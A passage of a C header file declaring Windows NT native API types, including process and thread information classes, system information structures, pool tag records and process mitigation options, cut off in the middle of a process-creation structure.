#define MAX_USTRING ( sizeof(WCHAR) * (MAXUSHORT/sizeof(WCHAR)) )
#endif

typedef struct _EX_RUNDOWN_REF {
    union
    {
        ULONG Count;
        PVOID Ptr;
    };
} EX_RUNDOWN_REF, *PEX_RUNDOWN_REF;

#ifdef _WIN64
#define MAX_FAST_REFS 15
#else
#define MAX_FAST_REFS 7
#endif

typedef struct _EX_FAST_REF {
    union {
        PVOID Object;
#if defined (_WIN64)
        ULONG_PTR RefCnt : 4;
#else
        ULONG_PTR RefCnt : 3;
#endif
        ULONG_PTR Value;
    };
} EX_FAST_REF, *PEX_FAST_REF;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

#ifndef STATIC_UNICODE_STRING
#define STATIC_UNICODE_STRING(string, value) \
  static UNICODE_STRING string = { sizeof(value) - sizeof(WCHAR), sizeof(value), value };
#endif

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;

typedef STRING OEM_STRING;
typedef PSTRING POEM_STRING;
typedef CONST STRING* PCOEM_STRING;
typedef CONST char *PCSZ;

typedef struct _CSTRING {
    USHORT Length;
    USHORT MaximumLength;
    CONST char *Buffer;
} CSTRING;
typedef CSTRING *PCSTRING;
#define ANSI_NULL ((CHAR)0)

typedef STRING CANSI_STRING;
typedef PSTRING PCANSI_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

#ifndef INTERFACE_TYPE
typedef enum _INTERFACE_TYPE {
    InterfaceTypeUndefined = -1,
    Internal = 0,
    Isa,
    Eisa,
    MicroChannel,
    TurboChannel,
    PCIBus,
    VMEBus,
    NuBus,
    PCMCIABus,
    CBus,
    MPIBus,
    MPSABus,
    ProcessorInternal,
    InternalPowerBus,
    PNPISABus,
    PNPBus,
    Vmcs,
    ACPIBus,
    MaximumInterfaceType
} INTERFACE_TYPE, * PINTERFACE_TYPE;
#endif

/*
** FileCache and MemoryList START
*/

typedef enum _SYSTEM_MEMORY_LIST_COMMAND {
    MemoryCaptureAccessedBits,
    MemoryCaptureAndResetAccessedBits,
    MemoryEmptyWorkingSets,
    MemoryFlushModifiedList,
    MemoryPurgeStandbyList,
    MemoryPurgeLowPriorityStandbyList,
    MemoryCommandMax
} SYSTEM_MEMORY_LIST_COMMAND;

typedef struct _SYSTEM_FILECACHE_INFORMATION {
    SIZE_T CurrentSize;
    SIZE_T PeakSize;
    ULONG PageFaultCount;
    SIZE_T MinimumWorkingSet;
    SIZE_T MaximumWorkingSet;
    SIZE_T CurrentSizeIncludingTransitionInPages;
    SIZE_T PeakSizeIncludingTransitionInPages;
    ULONG TransitionRePurposeCount;
    ULONG Flags;
} SYSTEM_FILECACHE_INFORMATION, *PSYSTEM_FILECACHE_INFORMATION;

/*
** FileCache and MemoryList END
*/

/*
** Processes START
*/

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
    LARGE_INTEGER BootTime;
    LARGE_INTEGER CurrentTime;
    LARGE_INTEGER TimeZoneBias;
    ULONG TimeZoneId;
    ULONG Reserved;
    ULONGLONG BootTimeBias;
    ULONGLONG SleepTimeBias;
} SYSTEM_TIMEOFDAY_INFORMATION, *PSYSTEM_TIMEOFDAY_INFORMATION;

typedef enum _THREAD_STATE {
    StateInitialized,
    StateReady,
    StateRunning,
    StateStandby,
    StateTerminated,
    StateWait,
    StateTransition,
    StateUnknown
} THREAD_STATE;

typedef enum _KWAIT_REASON {
    Executive = 0,
    FreePage,
    PageIn,
    PoolAllocation,
    DelayExecution,
    Suspended,
    UserRequest,
    WrExecutive,
    WrFreePage,
    WrPageIn,
    WrPoolAllocation,
    WrDelayExecution,
    WrSuspended,
    WrUserRequest,
    WrEventPair, //has no effect after 7
    WrQueue,
    WrLpcReceive,
    WrLpcReply,
    WrVirtualMemory,
    WrPageOut,
    WrRendezvous,
    WrKeyedEvent,
    WrTerminated,
    WrProcessInSwap,
    WrCpuRateControl,
    WrCalloutStack,
    WrKernel,
    WrResource,
    WrPushLock,
    WrMutex,
    WrQuantumEnd,
    WrDispatchInt,
    WrPreempted,
    WrYieldExecution,
    WrFastMutex,
    WrGuardedMutex,
    WrRundown,
    WrAlertByThreadId,
    WrDeferredPreempt,
    WrPhysicalFault,
    WrIoRing,
    WrMdlCache,
    WrRcu,
    MaximumWaitReason
} KWAIT_REASON;

typedef VOID KSTART_ROUTINE(
    _In_ PVOID StartContext
);
typedef KSTART_ROUTINE *PKSTART_ROUTINE;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _CLIENT_ID64 {
    ULONG64 UniqueProcess;
    ULONG64 UniqueThread;
} CLIENT_ID64, *PCLIENT_ID64;

typedef struct _CLIENT_ID32 {
    ULONG32 UniqueProcess;
    ULONG32 UniqueThread;
} CLIENT_ID32, *PCLIENT_ID32;

typedef struct _VM_COUNTERS {
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
} VM_COUNTERS;

typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    KPRIORITY BasePriority;
    ULONG ContextSwitchCount;
    THREAD_STATE State;
    KWAIT_REASON WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION {
    SYSTEM_THREAD_INFORMATION ThreadInfo;
    PVOID StackBase;
    PVOID StackLimit;
    PVOID Win32StartAddress;
    PVOID TebBase;
    ULONG_PTR Reserved2;
    ULONG_PTR Reserved3;
    ULONG_PTR Reserved4;
} SYSTEM_EXTENDED_THREAD_INFORMATION, *PSYSTEM_EXTENDED_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryDelta;
    ULONG ThreadCount;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    VM_COUNTERS VmCounters;
    IO_COUNTERS IoCounters;
    SYSTEM_THREAD_INFORMATION Threads[1]; //not a part of this structure
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef enum _SYSTEM_PROCESS_CLASSIFICATION {
    SystemProcessClassificationNormal,
    SystemProcessClassificationSystem,
    SystemProcessClassificationSecureSystem,
    SystemProcessClassificationMemCompression,
    SystemProcessClassificationRegistry,
    SystemProcessClassificationMaximum
} SYSTEM_PROCESS_CLASSIFICATION;

typedef struct _PROCESS_DISK_COUNTERS {
    ULONGLONG BytesRead;
    ULONGLONG BytesWritten;
    ULONGLONG ReadOperationCount;
    ULONGLONG WriteOperationCount;
    ULONGLONG FlushOperationCount;
} PROCESS_DISK_COUNTERS, *PPROCESS_DISK_COUNTERS;

typedef union _ENERGY_STATE_DURATION {
    union
    {
        ULONGLONG Value;
        ULONG LastChangeTime;
    };

    ULONG Duration : 31;
    ULONG IsInState : 1;
} ENERGY_STATE_DURATION, *PENERGY_STATE_DURATION;

typedef struct _PROCESS_ENERGY_VALUES {
    ULONGLONG Cycles[2][4];
    ULONGLONG DiskEnergy;
    ULONGLONG NetworkTailEnergy;
    ULONGLONG MBBTailEnergy;
    ULONGLONG NetworkTxRxBytes;
    ULONGLONG MBBTxRxBytes;
    union
    {
        ENERGY_STATE_DURATION Durations[3];
        struct
        {
            ENERGY_STATE_DURATION ForegroundDuration;
            ENERGY_STATE_DURATION DesktopVisibleDuration;
            ENERGY_STATE_DURATION PSMForegroundDuration;
        };
    };
    ULONG CompositionRendered;
    ULONG CompositionDirtyGenerated;
    ULONG CompositionDirtyPropagated;
    ULONG Reserved1;
    ULONGLONG AttributedCycles[4][2];
    ULONGLONG WorkOnBehalfCycles[4][2];
} PROCESS_ENERGY_VALUES, *PPROCESS_ENERGY_VALUES;

typedef struct _SYSTEM_PROCESS_INFORMATION_EXTENSION {
    PROCESS_DISK_COUNTERS DiskCounters;
    ULONGLONG ContextSwitches;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG HasStrongId : 1;
            ULONG Classification : 4; // SYSTEM_PROCESS_CLASSIFICATION
            ULONG BackgroundActivityModerated : 1;
            ULONG Spare : 26;
        };
    };
    ULONG UserSidOffset;
    ULONG PackageFullNameOffset;
    PROCESS_ENERGY_VALUES EnergyValues;
    ULONG AppIdOffset;
    SIZE_T SharedCommitCharge;
    ULONG JobObjectId;
    ULONG SpareUlong;
    ULONGLONG ProcessSequenceNumber;
} SYSTEM_PROCESS_INFORMATION_EXTENSION, *PSYSTEM_PROCESS_INFORMATION_EXTENSION;

typedef struct _SYSTEM_PROCESS_FULL_INFORMATION {
    SYSTEM_PROCESS_INFORMATION ProcessAndThreads;
    SYSTEM_PROCESS_INFORMATION_EXTENSION ExtendedInfo;
} SYSTEM_PROCESS_FULL_INFORMATION, *PSYSTEM_PROCESS_FULL_INFORMATION;

typedef struct _SYSTEM_PROCESS_ID_INFORMATION {
    HANDLE ProcessId;
    UNICODE_STRING ImageName;
} SYSTEM_PROCESS_ID_INFORMATION, *PSYSTEM_PROCESS_ID_INFORMATION;

typedef struct _SYSTEM_SECUREBOOT_INFORMATION {
    BOOLEAN SecureBootEnabled;
    BOOLEAN SecureBootCapable;
} SYSTEM_SECUREBOOT_INFORMATION, *PSYSTEM_SECUREBOOT_INFORMATION;

typedef struct _SYSTEM_SECUREBOOT_POLICY_INFORMATION {
    GUID PolicyPublisher;
    ULONG PolicyVersion;
    ULONG PolicyOptions;
} SYSTEM_SECUREBOOT_POLICY_INFORMATION, *PSYSTEM_SECUREBOOT_POLICY_INFORMATION;

typedef struct _SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION {
    SYSTEM_SECUREBOOT_POLICY_INFORMATION PolicyInformation;
    ULONG PolicySize;
    UCHAR Policy[1];
} SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION, *PSYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION;

typedef struct _SYSTEM_BASIC_INFORMATION {
    ULONG Reserved;
    ULONG TimerResolution;
    ULONG PageSize;
    ULONG NumberOfPhysicalPages;
    ULONG LowestPhysicalPageNumber;
    ULONG HighestPhysicalPageNumber;
    ULONG AllocationGranularity;
    ULONG_PTR MinimumUserModeAddress;
    ULONG_PTR MaximumUserModeAddress;
    ULONG_PTR ActiveProcessorsAffinityMask;
    CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_ISOLATED_USER_MODE_INFORMATION {
    BOOLEAN SecureKernelRunning : 1;
    BOOLEAN HvciEnabled : 1;
    BOOLEAN HvciStrictMode : 1;
    BOOLEAN DebugEnabled : 1;
    BOOLEAN FirmwarePageProtection : 1;
    BOOLEAN EncryptionKeyAvailable : 1;
    BOOLEAN SpareFlags : 2;
    BOOLEAN TrustletRunning : 1;
    BOOLEAN HvciDisableAllowed : 1;
    BOOLEAN HardwareEnforcedVbs : 1;
    BOOLEAN NoSecrets : 1;
    BOOLEAN EncryptionKeyPersistent : 1;
    BOOLEAN HardwareEnforcedHvpt : 1;
    BOOLEAN HardwareHvptAvailable : 1;
    BOOLEAN SpareFlags2 : 1;
    BOOLEAN Spare0[6];
    ULONGLONG Spare1;
} SYSTEM_ISOLATED_USER_MODE_INFORMATION, *PSYSTEM_ISOLATED_USER_MODE_INFORMATION;

typedef struct _SYSTEM_PROCESSOR_FEATURES_INFORMATION { //chappell
    ULONGLONG ProcessorFeatureBits;
    ULONGLONG Reserved[3];
} SYSTEM_PROCESSOR_FEATURES_INFORMATION, * PSYSTEM_PROCESSOR_FEATURES_INFORMATION;

typedef struct _SYSTEM_POOL_ENTRY {
    BOOLEAN Allocated;
    BOOLEAN Spare0;
    USHORT AllocatorBackTraceIndex;
    ULONG Size;
    union {
        UCHAR Tag[4];
        ULONG TagUlong;
        PVOID ProcessChargedQuota;
    };
} SYSTEM_POOL_ENTRY, * PSYSTEM_POOL_ENTRY;

typedef struct _SYSTEM_POOL_INFORMATION {
    SIZE_T TotalSize;
    PVOID FirstEntry;
    USHORT EntryOverhead;
    BOOLEAN PoolTagPresent;
    BOOLEAN Spare0;
    ULONG NumberOfEntries;
    SYSTEM_POOL_ENTRY Entries[1];
} SYSTEM_POOL_INFORMATION, * PSYSTEM_POOL_INFORMATION;

typedef struct _SYSTEM_POOLTAG {
    union {
        UCHAR Tag[4];
        ULONG TagUlong;
    };
    ULONG PagedAllocs;
    ULONG PagedFrees;
    SIZE_T PagedUsed;
    ULONG NonPagedAllocs;
    ULONG NonPagedFrees;
    SIZE_T NonPagedUsed;
} SYSTEM_POOLTAG, * PSYSTEM_POOLTAG;

typedef struct _SYSTEM_BIGPOOL_ENTRY {
    union {
        PVOID VirtualAddress;
        ULONG_PTR NonPaged : 1;
    };
    SIZE_T SizeInBytes;
    union {
        UCHAR Tag[4];
        ULONG TagUlong;
    };
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_POOLTAG_INFORMATION {
    ULONG Count;
    SYSTEM_POOLTAG TagInfo[1];
} SYSTEM_POOLTAG_INFORMATION, * PSYSTEM_POOLTAG_INFORMATION;

typedef struct _SYSTEM_SESSION_POOLTAG_INFORMATION {
    SIZE_T NextEntryOffset;
    ULONG SessionId;
    ULONG Count;
    SYSTEM_POOLTAG TagInfo[1];
} SYSTEM_SESSION_POOLTAG_INFORMATION, * PSYSTEM_SESSION_POOLTAG_INFORMATION;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
    ULONG Count;
    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;

typedef struct _SYSTEM_FIRMWARE_PARTITION_INFORMATION {
    UNICODE_STRING FirmwarePartition; // \Device\HarddiskX
} SYSTEM_FIRMWARE_PARTITION_INFORMATION, * PSYSTEM_FIRMWARE_PARTITION_INFORMATION;

typedef struct _RTL_PROCESS_BACKTRACE_INFORMATION {
    PCHAR SymbolicBackTrace;
    ULONG TraceCount;
    USHORT Index;
    USHORT Depth;
    PVOID BackTrace[32];
} RTL_PROCESS_BACKTRACE_INFORMATION, * PRTL_PROCESS_BACKTRACE_INFORMATION;

typedef struct _RTL_PROCESS_BACKTRACES {
    ULONG CommittedMemory;
    ULONG ReservedMemory;
    ULONG NumberOfBackTraceLookups;
    ULONG NumberOfBackTraces;
    RTL_PROCESS_BACKTRACE_INFORMATION BackTraces[1];
} RTL_PROCESS_BACKTRACES, * PRTL_PROCESS_BACKTRACES;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessQuotaLimits = 1,
    ProcessIoCounters = 2,
    ProcessVmCounters = 3,
    ProcessTimes = 4,
    ProcessBasePriority = 5,
    ProcessRaisePriority = 6,
    ProcessDebugPort = 7,
    ProcessExceptionPort = 8,
    ProcessAccessToken = 9,
    ProcessLdtInformation = 10,
    ProcessLdtSize = 11,
    ProcessDefaultHardErrorMode = 12,
    ProcessIoPortHandlers = 13,
    ProcessPooledUsageAndLimits = 14,
    ProcessWorkingSetWatch = 15,
    ProcessUserModeIOPL = 16,
    ProcessEnableAlignmentFaultFixup = 17,
    ProcessPriorityClass = 18,
    ProcessWx86Information = 19,
    ProcessHandleCount = 20,
    ProcessAffinityMask = 21,
    ProcessPriorityBoost = 22,
    ProcessDeviceMap = 23,
    ProcessSessionInformation = 24,
    ProcessForegroundInformation = 25,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessLUIDDeviceMapsEnabled = 28,
    ProcessBreakOnTermination = 29,
    ProcessDebugObjectHandle = 30,
    ProcessDebugFlags = 31,
    ProcessHandleTracing = 32,
    ProcessIoPriority = 33,
    ProcessExecuteFlags = 34,
    ProcessTlsInformation = 35,
    ProcessCookie = 36,
    ProcessImageInformation = 37,
    ProcessCycleTime = 38,
    ProcessPagePriority = 39,
    ProcessInstrumentationCallback = 40,
    ProcessThreadStackAllocation = 41,
    ProcessWorkingSetWatchEx = 42,
    ProcessImageFileNameWin32 = 43,
    ProcessImageFileMapping = 44,
    ProcessAffinityUpdateMode = 45,
    ProcessMemoryAllocationMode = 46,
    ProcessGroupInformation = 47,
    ProcessTokenVirtualizationEnabled = 48,
    ProcessConsoleHostProcess = 49, //ProcessOwnerInformation
    ProcessWindowInformation = 50,
    ProcessHandleInformation = 51,
    ProcessMitigationPolicy = 52,
    ProcessDynamicFunctionTableInformation = 53,
    ProcessHandleCheckingMode = 54,
    ProcessKeepAliveCount = 55,
    ProcessRevokeFileHandles = 56,
    ProcessWorkingSetControl = 57,
    ProcessHandleTable = 58,
    ProcessCheckStackExtentsMode = 59,
    ProcessCommandLineInformation = 60,
    ProcessProtectionInformation = 61,
    ProcessMemoryExhaustion = 62,
    ProcessFaultInformation = 63,
    ProcessTelemetryIdInformation = 64,
    ProcessCommitReleaseInformation = 65,
    ProcessDefaultCpuSetsInformation = 66,
    ProcessAllowedCpuSetsInformation = 67,
    ProcessSubsystemProcess = 68,
    ProcessJobMemoryInformation = 69,
    ProcessInPrivate = 70,
    ProcessRaiseUMExceptionOnInvalidHandleClose = 71,
    ProcessIumChallengeResponse = 72,
    ProcessChildProcessInformation = 73,
    ProcessHighGraphicsPriorityInformation = 74,
    ProcessSubsystemInformation = 75,
    ProcessEnergyValues = 76,
    ProcessActivityThrottleState = 77,
    ProcessActivityThrottlePolicy = 78,
    ProcessWin32kSyscallFilterInformation = 79,
    ProcessDisableSystemAllowedCpuSets = 80,
    ProcessWakeInformation = 81,
    ProcessEnergyTrackingState = 82,
    ProcessManageWritesToExecutableMemory = 83,
    ProcessCaptureTrustletLiveDump = 84,
    ProcessTelemetryCoverage = 85,
    ProcessEnclaveInformation = 86,
    ProcessEnableReadWriteVmLogging = 87,
    ProcessUptimeInformation = 88,
    ProcessImageSection = 89,
    ProcessDebugAuthInformation = 90,
    ProcessSystemResourceManagement = 91,
    ProcessSequenceNumber = 92,
    ProcessLoaderDetour = 93,
    ProcessSecurityDomainInformation = 94,
    ProcessCombineSecurityDomainsInformation = 95,
    ProcessEnableLogging = 96,
    ProcessLeapSecondInformation = 97,
    ProcessFiberShadowStackAllocation = 98,
    ProcessFreeFiberShadowStackAllocation = 99,
    ProcessAltSystemCallInformation = 100,
    ProcessDynamicEHContinuationTargets = 101,
    ProcessDynamicEnforcedCetCompatibleRanges = 102,
    ProcessCreateStateChange = 103,
    ProcessApplyStateChange = 104,
    ProcessEnableOptionalXStateFeatures = 105,
    ProcessAltPrefetchParam = 106,
    ProcessAssignCpuPartitions = 107,
    ProcessPriorityClassEx = 108,
    ProcessMembershipInformation = 109,
    ProcessEffectiveIoPriority = 110,
    ProcessEffectivePagePriority = 111,
    ProcessSchedulerSharedData = 112,
    ProcessSlistRollbackInformation = 113,
    ProcessNetworkIoCounters = 114,
    ProcessFindFirstThreadByTebValue = 115,
    ProcessEnclaveAddressSpaceRestriction = 116,
    ProcessAvailableCpus = 117,
    MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef enum _THREADINFOCLASS {
    ThreadBasicInformation,
    ThreadTimes,
    ThreadPriority,
    ThreadBasePriority,
    ThreadAffinityMask,
    ThreadImpersonationToken,
    ThreadDescriptorTableEntry,
    ThreadEnableAlignmentFaultFixup,
    ThreadEventPair,
    ThreadQuerySetWin32StartAddress,
    ThreadZeroTlsCell,
    ThreadPerformanceCount,
    ThreadAmILastThread,
    ThreadIdealProcessor,
    ThreadPriorityBoost,
    ThreadSetTlsArrayAddress,
    ThreadIsIoPending,
    ThreadHideFromDebugger,
    ThreadBreakOnTermination,
    ThreadSwitchLegacyState,
    ThreadIsTerminated,
    ThreadLastSystemCall,
    ThreadIoPriority,
    ThreadCycleTime,
    ThreadPagePriority,
    ThreadActualBasePriority,
    ThreadTebInformation,
    ThreadCSwitchMon,
    ThreadCSwitchPmu,
    ThreadWow64Context,
    ThreadGroupInformation,
    ThreadUmsInformation,
    ThreadCounterProfiling,
    ThreadIdealProcessorEx,
    ThreadCpuAccountingInformation,
    ThreadSuspendCount,
    ThreadHeterogeneousCpuPolicy,
    ThreadContainerId,
    ThreadNameInformation,
    ThreadSelectedCpuSets,
    ThreadSystemThreadInformation,
    ThreadActualGroupAffinity,
    ThreadDynamicCodePolicyInfo,
    ThreadExplicitCaseSensitivity,
    ThreadWorkOnBehalfTicket,
    ThreadSubsystemInformation,
    ThreadDbgkWerReportActive,
    ThreadAttachContainer,
    ThreadManageWritesToExecutableMemory,
    ThreadPowerThrottlingState,
    ThreadWorkloadClass,
    ThreadCreateStateChange,
    ThreadApplyStateChange,
    ThreadStrongerBadHandleChecks,
    ThreadEffectiveIoPriority,
    ThreadEffectivePagePriority,
    ThreadUpdateLockOwnership,
    ThreadSchedulerSharedDataSlot,
    ThreadTebInformationAtomic,
    ThreadIndexInformation,
    MaxThreadInfoClass
} THREADINFOCLASS;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID ClientId;
    ULONG_PTR AffinityMask;
    KPRIORITY Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// taken from ph2(whatever)
typedef struct _THREAD_LAST_SYSCALL_INFORMATION {
    PVOID FirstArgument;
    USHORT SystemCallNumber;
#ifdef WIN64
    USHORT Pad[0x3]; // since REDSTONE2
#else
    USHORT Pad[0x1]; // since REDSTONE2
#endif
    ULONG64 WaitTime;
} THREAD_LAST_SYSCALL_INFORMATION, * PTHREAD_LAST_SYSCALL_INFORMATION;

typedef struct _THREAD_NAME_INFORMATION {
    UNICODE_STRING ThreadName;
} THREAD_NAME_INFORMATION, * PTHREAD_NAME_INFORMATION;

typedef struct _PROCESS_EXTENDED_BASIC_INFORMATION {
    SIZE_T Size;
    PROCESS_BASIC_INFORMATION BasicInfo;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG IsProtectedProcess : 1;
            ULONG IsWow64Process : 1;
            ULONG IsProcessDeleting : 1;
            ULONG IsCrossSessionCreate : 1;
            ULONG IsFrozen : 1;
            ULONG IsBackground : 1;
            ULONG IsStronglyNamed : 1;
            ULONG IsSecureProcess : 1;
            ULONG IsSubsystemProcess : 1;
            ULONG SpareBits : 23;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_EXTENDED_BASIC_INFORMATION, *PPROCESS_EXTENDED_BASIC_INFORMATION;

typedef struct _PROCESS_ACCESS_TOKEN {
    HANDLE Token;
    HANDLE Thread;
} PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ULONG GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, *PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, *PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef enum _PROCESS_STATE_CHANGE_TYPE {
    ProcessStateChangeSuspend,
    ProcessStateChangeResume,
    ProcessStateChangeMax,
} PROCESS_STATE_CHANGE_TYPE, *PPROCESS_STATE_CHANGE_TYPE;

typedef enum _THREAD_STATE_CHANGE_TYPE {
    ThreadStateChangeSuspend,
    ThreadStateChangeResume,
    ThreadStateChangeMax,
} THREAD_STATE_CHANGE_TYPE, *PTHREAD_STATE_CHANGE_TYPE;

//
// Process/Thread System and User Time
//  NtQueryInformationProcess using ProcessTimes
//  NtQueryInformationThread using ThreadTimes
//
typedef struct _KERNEL_USER_TIMES {
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER ExitTime;
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
} KERNEL_USER_TIMES, *PKERNEL_USER_TIMES;

typedef enum _PS_MITIGATION_OPTION {
    PS_MITIGATION_OPTION_NX,
    PS_MITIGATION_OPTION_SEHOP,
    PS_MITIGATION_OPTION_FORCE_RELOCATE_IMAGES,
    PS_MITIGATION_OPTION_HEAP_TERMINATE,
    PS_MITIGATION_OPTION_BOTTOM_UP_ASLR,
    PS_MITIGATION_OPTION_HIGH_ENTROPY_ASLR,
    PS_MITIGATION_OPTION_STRICT_HANDLE_CHECKS,
    PS_MITIGATION_OPTION_WIN32K_SYSTEM_CALL_DISABLE,
    PS_MITIGATION_OPTION_EXTENSION_POINT_DISABLE,
    PS_MITIGATION_OPTION_PROHIBIT_DYNAMIC_CODE,
    PS_MITIGATION_OPTION_CONTROL_FLOW_GUARD,
    PS_MITIGATION_OPTION_BLOCK_NON_MICROSOFT_BINARIES,
    PS_MITIGATION_OPTION_FONT_DISABLE,
    PS_MITIGATION_OPTION_IMAGE_LOAD_NO_REMOTE,
    PS_MITIGATION_OPTION_IMAGE_LOAD_NO_LOW_LABEL,
    PS_MITIGATION_OPTION_IMAGE_LOAD_PREFER_SYSTEM32,
    PS_MITIGATION_OPTION_RETURN_FLOW_GUARD,
    PS_MITIGATION_OPTION_LOADER_INTEGRITY_CONTINUITY,
    PS_MITIGATION_OPTION_STRICT_CONTROL_FLOW_GUARD,
    PS_MITIGATION_OPTION_RESTRICT_SET_THREAD_CONTEXT,
    PS_MITIGATION_OPTION_ROP_STACKPIVOT,
    PS_MITIGATION_OPTION_ROP_CALLER_CHECK,
    PS_MITIGATION_OPTION_ROP_SIMEXEC,
    PS_MITIGATION_OPTION_EXPORT_ADDRESS_FILTER,
    PS_MITIGATION_OPTION_EXPORT_ADDRESS_FILTER_PLUS,
    PS_MITIGATION_OPTION_RESTRICT_CHILD_PROCESS_CREATION,
    PS_MITIGATION_OPTION_IMPORT_ADDRESS_FILTER,
    PS_MITIGATION_OPTION_MODULE_TAMPERING_PROTECTION,
    PS_MITIGATION_OPTION_RESTRICT_INDIRECT_BRANCH_PREDICTION,
    PS_MITIGATION_OPTION_SPECULATIVE_STORE_BYPASS_DISABLE,
    PS_MITIGATION_OPTION_ALLOW_DOWNGRADE_DYNAMIC_CODE_POLICY,
    PS_MITIGATION_OPTION_CET_SHADOW_STACKS,
    PS_MITIGATION_OPTION_USER_CET_SET_CONTEXT_IP_VALIDATION,
    PS_MITIGATION_OPTION_BLOCK_NON_CET_BINARIES,
    PS_MITIGATION_OPTION_CET_DYNAMIC_APIS_OUT_OF_PROC_ONLY,
    PS_MITIGATION_OPTION_REDIRECTION_TRUST,
    PS_MITIGATION_OPTION_RESTRICT_CORE_SHARING,
    PS_MITIGATION_OPTION_FSCTL_SYSTEM_CALL_DISABLE
} PS_MITIGATION_OPTION;

typedef enum _PS_CREATE_STATE {
    PsCreateInitialState,
    PsCreateFailOnFileOpen,
    PsCreateFailOnSectionCreate,
    PsCreateFailExeFormat,
    PsCreateFailMachineMismatch,
    PsCreateFailExeName,
    PsCreateSuccess,
    PsCreateMaximumStates
} PS_CREATE_STATE;

typedef struct _PS_CREATE_INFO {
    SIZE_T Size;
    PS_CREATE_STATE State;
    union
    {
        struct
        {
            union
            {
                ULONG InitFlags;
                struct
                {
                    UCHAR WriteOutputOnExit : 1;
                    UCHAR DetectManifest : 1;
                    UCHAR IFEOSkipDebugger : 1;
                    UCHAR IFEODoNotPropagateKeyState : 1;
                    UCHAR SpareBits1 : 4;
                    UCHAR SpareBits2 : 8;
                    USHORT ProhibitedImageCharacteristics : 16;
                };
            };
